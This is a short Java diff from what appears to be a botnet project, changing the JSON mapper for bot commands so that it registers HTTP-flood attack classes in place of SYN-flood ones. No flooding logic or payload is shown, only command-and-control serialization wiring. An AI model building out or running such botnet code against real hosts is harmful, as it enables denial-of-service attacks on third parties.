@@ -26,9 +26,9 @@
 
 package com.acmutv.botnet.core.control.command.serial;
 
-import com.acmutv.botnet.core.attack.SynFloodAttack;
-import com.acmutv.botnet.core.attack.serial.SynFloodAttackDeserializer;
-import com.acmutv.botnet.core.attack.serial.SynFloodAttackSerializer;
+import com.acmutv.botnet.core.attack.flooding.HttpFloodAttack;
+import com.acmutv.botnet.core.attack.flooding.serial.HttpFloodAttackDeserializer;
+import com.acmutv.botnet.core.attack.flooding.serial.HttpFloodAttackSerializer;
 import com.acmutv.botnet.core.control.command.BotCommand;
 import com.fasterxml.jackson.databind.ObjectMapper;
 import com.fasterxml.jackson.databind.SerializationFeature;
@@ -54,9 +54,9 @@ public class BotCommandJsonMapper extends ObjectMapper {
     super();
     SimpleModule module = new SimpleModule();
     module.addSerializer(BotCommand.class, BotCommandSerializer.getInstance());
-    module.addSerializer(SynFloodAttack.class, SynFloodAttackSerializer.getInstance());
+    module.addSerializer(HttpFloodAttack.class, HttpFloodAttackSerializer.getInstance());
     module.addDeserializer(BotCommand.class, BotCommandDeserializer.getInstance());
-    module.addDeserializer(SynFloodAttack.class, SynFloodAttackDeserializer.getInstance());
+    module.addDeserializer(HttpFloodAttack.class, HttpFloodAttackDeserializer.getInstance());
     super.registerModule(module);
     super.enable(SerializationFeature.INDENT_OUTPUT);
   }
